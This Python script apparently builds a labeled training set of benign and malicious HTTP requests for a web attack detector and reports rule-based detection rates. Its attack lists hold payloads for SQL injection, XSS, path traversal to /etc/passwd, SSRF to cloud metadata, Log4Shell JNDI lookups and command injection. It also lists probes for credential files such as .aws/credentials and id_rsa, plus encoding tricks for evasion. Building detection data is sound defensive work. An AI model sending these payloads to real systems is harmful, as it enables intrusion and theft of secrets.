"""Generate a labeled dataset: benign traffic vs classic, evasive and recon attacks."""
import csv
import os
import random

from app.features import FEATURES, extract
from app.rules import detect

random.seed(1337)

WORDS = ["laptop", "router", "python", "network", "security", "campus", "lagos", "exam",
         "timetable", "course", "phone", "charger", "notes", "result", "hostel", "library",
         "football", "jollof", "news", "weather"]
BROWSER_UAS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
]
TOOL_UAS = ["curl/8.5.0", "sqlmap/1.8#stable (https://sqlmap.org)", "Nikto/2.5.0",
            "python-requests/2.31.0", "Wget/1.21.4", "gobuster/3.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)"]
DEV_UAS = ["curl/8.5.0", "python-requests/2.31.0"]  # benign tools exist too


def w():
    return random.choice(WORDS)


def n():
    return random.randint(1, 9999)


def nulls():
    return ",".join(["null"] * random.randint(2, 6))


BENIGN = [
    lambda: ("GET", "/", None),
    lambda: ("GET", "/login", None),
    lambda: ("POST", "/login", None),
    lambda: ("GET", f"/profile?id={n()}", None),
    lambda: ("GET", f"/search?q={w()}", None),
    lambda: ("GET", f"/search?q={w()}+{w()}+{w()}", None),
    lambda: ("GET", f"/static/{w()}.{random.choice(['css', 'js', 'png'])}", None),
    lambda: ("GET", f"/api/items?page={random.randint(1, 50)}&limit={random.choice([10, 20, 50])}", None),
    lambda: ("GET", f"/blog/{w()}-{w()}", None),
    lambda: ("GET", f"/products/{n()}?ref={w()}", None),
    lambda: ("POST", "/comment", None),
    lambda: ("GET", "/search?q=O%27Brien", None),
    lambda: ("GET", f"/search?q=how+to+select+a+{w()}+from+{w()}", None),
    lambda: ("GET", f"/search?q={w()}%26{w()}", None),
    lambda: ("GET", f"/redirect?next=/{w()}", None),
    lambda: ("GET", "/favicon.ico", None),
]

CLASSIC = [
    lambda: ("GET", f"/search?q={n()}%27%20OR%20{n()}={n()}--", None),
    lambda: ("GET", f"/search?q=%27%20UNION%20SELECT%20{nulls()}--", None),
    lambda: ("GET", f"/comment?c=%3Cscript%3Ealert({n()})%3C/script%3E", None),
    lambda: ("GET", "/profile?bio=%3Cimg%20src=x%20onerror=alert(1)%3E", None),
    lambda: ("GET", f"/download?f={'../' * random.randint(2, 6)}etc/passwd", None),
    lambda: ("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", None),
    lambda: ("GET", "/fetch?url=http://localhost:8080/admin", None),
    lambda: ("GET", "/", "${jndi:ldap://x.example/a}"),
]

EVASIVE = [
    lambda: ("GET", "/search?q=1%27/**/oR/**/%271%27=%271", None),
    lambda: ("GET", f"/item?id={n()}+and+substring(@@version,1,1)=5", None),
    lambda: ("GET", f"/item?id={n()}+order+by+{random.randint(1, 12)}--+-", None),
    lambda: ("GET", "/c?x=%3Cdetails/open/ontoggle=alert(1)%3E", None),
    lambda: ("GET", "/c?x=%3Cinput+autofocus+onfocus=alert(1)%3E", None),
    lambda: ("GET", "/c?x=%3Cbody+onpageshow=alert(1)%3E", None),
    lambda: ("GET", "/download?f=..%c0%af..%c0%afetc/passwd", None),
    lambda: ("GET", "/download?f=%2e%2e%5c%2e%2e%5cboot.ini", None),
    lambda: ("GET", "/fetch?url=http://2130706433/", None),
    lambda: ("GET", "/fetch?url=http://[::1]/admin", None),
    lambda: ("GET", "/fetch?url=http://metadata.google.internal/computeMetadata/v1/", None),
    lambda: ("GET", "/", "${j${::-n}di:ldap://x.example/a}"),
]

RECON_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin.php",
               "/cgi-bin/test.cgi", "/actuator/env", "/server-status", "/backup.zip",
               "/config.php.bak", "/xmlrpc.php", "/.aws/credentials"]
RECON = [lambda: ("GET", random.choice(RECON_PATHS), None)]

# --- round 2: families holdout v1 showed were missing (instances differ from both holdout sets) ---
BENIGN.extend([
    lambda: ("GET", f"/login?next=%2F{w()}%2F{w()}", None),
    lambda: ("GET", f"/search?q={w()}%20{w()}%2C%20{w()}", None),
    lambda: ("GET", f"/settings?section={w()}&lang=en%2DNG", None),
    lambda: ("GET", f"/files/{w()}_{n()}.pdf", None),
])
# --- round 4 (generalization fix): hard benigns that previously false-positived ---
BENIGN.extend([
    lambda: ("GET", "/redirect?url=https://www.jumia.com.ng/phones", None),
    lambda: ("GET", "/wp-content/uploads/2026/10/cover.jpg", None),
    lambda: ("GET", "/api/search?q=select+committee+report", None),
    lambda: ("GET", "/blog/benchmark-results-2026", None),
    lambda: ("GET", "/search?q=how+to+order+by+phone", None),
    lambda: ("GET", f"/images/hero%20banner{n()}.png", None),
    lambda: ("GET", f"/docs/getting-started?lang=en#install", None),
    lambda: ("GET", f"/api/v1/orders/{n()}/track?sort=-created_at", None),
])
# --- round 5 (gap closure): plus-sign / math benigns vs C++ FP ---
BENIGN.extend([
    lambda: ("GET", "/search?q=C%2B%2B+tutorial", None),
    lambda: ("GET", f"/search?q={w()}%2B{w()}+guide", None),
    lambda: ("GET", "/api/calc?expr=1%2B2%2B3", None),
    lambda: ("GET", "/search?q=a%2Bb%3Dc+explained", None),
    lambda: ("GET", "/blog/c%2B%2B-vs-rust-2026", None),
])
# --- round 6 (edge sweep): short statics + dash-UA must stay benign ---
BENIGN.extend([
    lambda: ("GET", "/wp-content/uploads/a.jpg", None),
    lambda: ("GET", "/static/app.js", None),
    lambda: ("GET", "/images/x.png", None),
    lambda: ("GET", "/", None),
    lambda: ("GET", "/favicon.ico", None),
])
EVASIVE.extend([
    lambda: ("GET", f"/api/items?price[$gt]={random.randint(0, 5)}", None),
    lambda: ("GET", f"/api/auth?email[$regex]=.*&password[$ne]={n()}", None),
    lambda: ("GET", "/users?filter[$where]=sleep(5000)", None),
    lambda: ("GET", f"/redirect?url=//{w()}.example.org/{w()}", None),
    lambda: ("GET", f"/login?next=https://{w()}.example.com@bank.example", None),
    lambda: ("GET", f"/item?id={n()};SELECT+pg_sleep({random.randint(3, 9)})--", None),
    lambda: ("GET", f"/c?x=%22%3E%3Csvg+onload=confirm({n()})%3E", None),
])
RECON_PATHS.extend(["/wp-content/plugins/readme.txt", "/solr/admin/cores",
                    "/vendor/composer/installed.json", "/.DS_Store", "/WEB-INF/web.xml",
                    "/jmx-console/", "/actuator/heapdump", "/struts2-showcase/",
                    "/id_rsa", "/dump.sql"])

# --- round 4: previously uncovered families (basic instances; v4 uses DIFFERENT vectors) ---
NOVEL = [
    lambda: ("GET", f"/greet?name={{{{7*7}}}}", None),
    lambda: ("GET", "/hello?name=${7*7}", None),
    lambda: ("GET", f"/ping?host=8.8.8.8%3Bcat%20%2Fetc%2Fpasswd", None),
    lambda: ("GET", "/run?cmd=ls%7Cid", None),
    lambda: ("GET", f"/ping?host=127.0.0.1%7Cwhoami", None),
    lambda: ("GET", f"/exec?x=1%3Bwhoami", None),
    lambda: ("GET", "/exec?cmd=%60whoami%60", None),
    lambda: ("GET", "/ping?host=%60cat%20%2Fetc%2Fpasswd%60", None),
    lambda: ("GET", "/lookup?user=*)(uid=*))(|(uid=*", None),
    lambda: ("GET", "/search?filter=(cn=*admin*)", None),
    lambda: ("GET", "/set?lang=en%0d%0aX-Injected%3A+1", None),
    lambda: ("GET", "/go?to=%0A%0DSet-Cookie%3A+admin%3Dtrue", None),
]


def _rand_case(s: str) -> str:
    return "".join(c.upper() if c.isalpha() and random.random() < 0.3 else c for c in s)


def _inline_comment(s: str) -> str:
    if random.random() < 0.5 and " " in s:
        return s.replace(" ", "/**/", 1)
    return s


def _double_encode_pct(s: str) -> str:
    if "%" in s and random.random() < 0.4:
        return s.replace("%", "%25", 1)
    return s


def _apply_obfs(path: str) -> str:
    # Break exact template memorization: case jitter + comment tricks + 1 double-encode.
    # Applied to attacks only, ~40% of the time.
    if random.random() > 0.4:
        return path
    if "UNION" in path.upper() or "SELECT" in path.upper() or "OR" in path.upper():
        path = _rand_case(path)
        path = _inline_comment(path)
    return _double_encode_pct(path)


def _mutate(path: str) -> str:
    """Small realistic noise applied to ~15% of ALL rows: param shuffle,
    extra benign param, delimiter swap. Forces model off exact templates."""
    if random.random() > 0.15 or "?" not in path:
        return path
    base, _, q = path.partition("?")
    params = q.split("&")
    if len(params) > 1 and random.random() < 0.5:
        random.shuffle(params)
    if random.random() < 0.4:
        params.append(f"utm_{random.choice(['source','medium'])}={w()}")
    if random.random() < 0.3:
        return base + "?" + ";".join(params)
    return base + "?" + "&".join(params)

ATTACKS = {"classic": CLASSIC, "evasive": EVASIVE, "recon": RECON, "novel": NOVEL}


def make_row(label, category, method, path, ua, body=""):
    rec = {"path": path, "ua": ua, "method": method, "body": body}
    row = {"label": label, "category": category,
           "rules_flag": int(bool(detect(rec))), "path": path, "ua": ua, "body": body}
    row.update(zip(FEATURES, extract(rec)))
    return row


BENIGN_BODIES = ["username=test&password=test123", '{"q":"laptop","page":1}', '{"comment":"great post!"}', ""]
ATTACK_BODIES = ["' OR 1=1--", '{"$ne": 1}', '{"$where": "sleep(1000)"}', "{{7*7}}", "<script>alert(1)</script>", "a;cat /etc/passwd"]


def build(n_each=3000):
    rows = []
    for _ in range(n_each):
        method, path, ua = random.choice(BENIGN)()
        if ua is None:
            r = random.random()
            if r < 0.05:
                ua = random.choice(DEV_UAS)
            elif r < 0.08:
                ua = "-"  # real logs use dash for missing UA; must stay benign
            else:
                ua = random.choice(BROWSER_UAS)
        body = random.choice(BENIGN_BODIES) if method == "POST" else ""
        rows.append(make_row(0, "benign", method, _mutate(path), ua, body))
    for _ in range(n_each):
        cat = random.choices(["classic", "evasive", "recon", "novel"], weights=[0.32, 0.32, 0.16, 0.2])[0]
        method, path, ua = random.choice(ATTACKS[cat])()
        path = _mutate(_apply_obfs(path))
        if ua is None:
            ua = random.choice(TOOL_UAS) if random.random() < 0.6 else random.choice(BROWSER_UAS)
        body = ""
        if cat == "novel":
            if random.random() < 0.4:
                body = random.choice(ATTACK_BODIES)
                if method == "GET":
                    method = "POST"
        elif method == "POST" or random.random() < 0.15:
            body = random.choice(ATTACK_BODIES) if cat in ("classic", "evasive", "novel") else ""
            if body and method == "GET":
                method = "POST"
        rows.append(make_row(1, cat, method, path, ua, body))
    random.shuffle(rows)
    return rows


if __name__ == "__main__":
    rows = build()
    os.makedirs("data", exist_ok=True)
    with open("data/dataset.csv", "w", newline="") as f:
        wr = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        wr.writeheader()
        wr.writerows(rows)
    print(f"wrote {len(rows)} rows -> data/dataset.csv")
    benign = [r for r in rows if r["label"] == 0]
    print(f"rules false-positive rate on benign: {sum(r['rules_flag'] for r in benign) / len(benign):.1%}")
    for cat in ("classic", "evasive", "recon", "novel"):
        sub = [r for r in rows if r["category"] == cat]
        print(f"rules-only detection on {cat}: {sum(r['rules_flag'] for r in sub) / len(sub):.1%}")
